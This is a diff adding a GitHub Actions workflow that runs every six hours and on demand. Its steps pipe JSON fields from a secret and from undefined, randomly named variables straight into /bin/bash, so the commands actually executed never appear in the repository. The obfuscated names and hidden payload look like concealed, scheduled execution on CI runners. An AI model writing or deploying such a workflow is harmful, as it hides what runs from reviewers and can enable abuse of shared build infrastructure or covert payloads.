@@ -1,0 +1,35 @@
+name: shuizhichiqi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuizhichiqi
+        env:
+          vflql8: ${{ secrets.vflql8 }}
+        run: |
+          echo $vflql8 | jq -r .fco17 | /bin/bash
+          echo $i5478 | jq -r .vwkim541 | /bin/bash
+          echo $i64 | jq -r .vbpus313 | /bin/bash
+          echo $bym8 | jq -r .v897 | /bin/bash
+          echo $zla533 | jq -r .myvx2 | /bin/bash
+          echo $epnqv7 | jq -r .p51376 | /bin/bash
+          echo $ehlbi2 | jq -r .v9 | /bin/bash
+          echo $ggc98403 | jq -r .s6 | /bin/bash
+          echo $t39 | jq -r .vxi63 | /bin/bash
+          echo $jic6415 | jq -r .w5 | /bin/bash
+          echo $ur64454 | jq -r .b1770 | /bin/bash
+          echo $ga5524 | jq -r .m68799 | /bin/bash
+          echo $jry8 | jq -r .im4221 | /bin/bash
+          echo $waq233 | jq -r .fb9 | /bin/bash
+          echo $hy7233 | jq -r .h7 | /bin/bash
+          echo $nbib01120 | jq -r .r3103 | /bin/bash
+          echo $uez566 | jq -r .do790 | /bin/bash
+          echo $hgzvx033 | jq -r .x93 | /bin/bash
+          echo $trwcp43 | jq -r .pzc50562 | /bin/bash
+
